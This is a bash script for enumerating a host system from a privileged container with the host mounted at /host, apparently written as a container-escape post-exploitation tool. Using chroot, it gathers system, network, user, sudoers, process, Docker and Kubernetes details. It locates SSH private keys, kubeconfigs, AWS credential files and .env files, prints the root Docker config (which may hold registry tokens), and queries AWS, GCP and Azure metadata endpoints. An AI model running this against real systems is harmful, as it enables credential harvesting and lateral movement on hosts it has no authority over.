#!/bin/bash
# Comprehensive Host System Enumeration
# Run from privileged container with /host mount

echo "=========================================="
echo "  HOST SYSTEM ENUMERATION"
echo "=========================================="
echo ""

echo "=== 1. SYSTEM INFORMATION ==="
echo "[*] Operating System:"
chroot /host cat /etc/os-release 2>/dev/null | grep -E "(NAME|VERSION|ID)" | head -5
echo ""

echo "[*] Kernel Version:"
chroot /host uname -a 2>/dev/null
echo ""

echo "[*] Hostname:"
chroot /host hostname 2>/dev/null
chroot /host cat /etc/hostname 2>/dev/null
echo ""

echo "[*] Uptime:"
chroot /host uptime 2>/dev/null
echo ""

echo "[*] CPU Information:"
chroot /host cat /proc/cpuinfo 2>/dev/null | grep -E "(model name|processor)" | head -5
echo ""

echo "[*] Memory Information:"
chroot /host free -h 2>/dev/null
echo ""

echo "=== 2. NETWORK CONFIGURATION ==="
echo "[*] Network Interfaces:"
chroot /host ip addr show 2>/dev/null | grep -E "(^[0-9]|inet )" | head -20
echo ""

echo "[*] Routing Table:"
chroot /host ip route 2>/dev/null | head -10
echo ""

echo "[*] ARP Table:"
chroot /host cat /proc/net/arp 2>/dev/null
echo ""

echo "[*] Listening Ports (from /proc/net/tcp):"
chroot /host cat /proc/net/tcp 2>/dev/null | awk '{print $2, $10}' | head -20
echo ""

echo "[*] DNS Configuration:"
chroot /host cat /etc/resolv.conf 2>/dev/null
echo ""

echo "=== 3. USERS AND GROUPS ==="
echo "[*] Users (from /etc/passwd):"
chroot /host cat /etc/passwd 2>/dev/null | grep -v nologin | head -20
echo ""

echo "[*] Groups:"
chroot /host cat /etc/group 2>/dev/null | head -20
echo ""

echo "[*] Sudoers:"
chroot /host cat /etc/sudoers 2>/dev/null | grep -v "^#" | grep -v "^$" | head -10
echo ""

echo "[*] Last logged in users:"
chroot /host last 2>/dev/null | head -10
echo ""

echo "=== 4. RUNNING PROCESSES ==="
echo "[*] Top processes:"
chroot /host ps aux 2>/dev/null | head -20
echo ""

echo "[*] Systemd services:"
chroot /host systemctl list-units --type=service --state=running 2>/dev/null | head -20
echo ""

echo "=== 5. INSTALLED SOFTWARE ==="
echo "[*] Installed packages (if apt):"
chroot /host dpkg -l 2>/dev/null | head -20
echo ""

echo "[*] Installed packages (if rpm):"
chroot /host rpm -qa 2>/dev/null | head -20
echo ""

echo "=== 6. DOCKER/KUBERNETES ==="
echo "[*] Docker version:"
chroot /host docker --version 2>/dev/null || echo "  Docker CLI not found"
echo ""

echo "[*] Docker containers on host:"
chroot /host docker ps -a 2>/dev/null | head -10 || echo "  Cannot list containers"
echo ""

echo "[*] Kubernetes components:"
chroot /host ls -la /var/lib/kubelet/ 2>/dev/null | head -10 || echo "  Kubelet not found"
chroot /host ls -la /etc/kubernetes/ 2>/dev/null | head -10 || echo "  Kubernetes config not found"
echo ""

echo "[*] Container runtime sockets:"
chroot /host find /run /var/run -name "*.sock" 2>/dev/null | grep -E "(docker|containerd|crio)" | head -10
echo ""

echo "=== 7. CREDENTIALS AND SENSITIVE FILES ==="
echo "[*] SSH keys:"
chroot /host find /root /home -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null | head -10
echo ""

echo "[*] Docker config:"
chroot /host cat /root/.docker/config.json 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "  No Docker config found"
echo ""

echo "[*] Kubernetes configs:"
chroot /host find /root /home -path "*/.kube/config" 2>/dev/null | head -5
chroot /host find /etc -name "kubeconfig" 2>/dev/null | head -5
echo ""

echo "[*] AWS credentials:"
chroot /host find /root /home -path "*/.aws/credentials" 2>/dev/null | head -5
echo ""

echo "[*] Environment files with secrets:"
chroot /host find /root /home -name ".env" -o -name ".envrc" 2>/dev/null | head -10
echo ""

echo "=== 8. SCHEDULED TASKS ==="
echo "[*] Crontab (root):"
chroot /host crontab -l -u root 2>/dev/null || echo "  No root crontab"
echo ""

echo "[*] System crontab:"
chroot /host cat /etc/crontab 2>/dev/null
echo ""

echo "[*] Cron directories:"
chroot /host ls -la /etc/cron.d/ 2>/dev/null | head -10
chroot /host ls -la /etc/cron.daily/ 2>/dev/null | head -5
echo ""

echo "[*] Systemd timers:"
chroot /host systemctl list-timers 2>/dev/null | head -10
echo ""

echo "=== 9. FILE SYSTEM ==="
echo "[*] Mounted filesystems:"
chroot /host mount 2>/dev/null | head -20
echo ""

echo "[*] Disk usage:"
chroot /host df -h 2>/dev/null | head -15
echo ""

echo "[*] Large files (top 10):"
chroot /host find / -type f -size +100M 2>/dev/null | head -10
echo ""

echo "=== 10. LOGS ==="
echo "[*] Recent auth logs:"
chroot /host tail -20 /var/log/auth.log 2>/dev/null || chroot /host tail -20 /var/log/secure 2>/dev/null | head -20
echo ""

echo "[*] Recent system logs:"
chroot /host journalctl -n 20 --no-pager 2>/dev/null | head -20
echo ""

echo "=== 11. CLOUD METADATA ==="
echo "[*] AWS metadata:"
curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -10 || echo "  Not AWS"
echo ""

echo "[*] GCP metadata:"
curl -s --max-time 2 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null | head -10 || echo "  Not GCP"
echo ""

echo "[*] Azure metadata:"
curl -s --max-time 2 -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 2>/dev/null | head -5 || echo "  Not Azure"
echo ""

echo "=========================================="
echo "  ENUMERATION COMPLETE"
echo "=========================================="
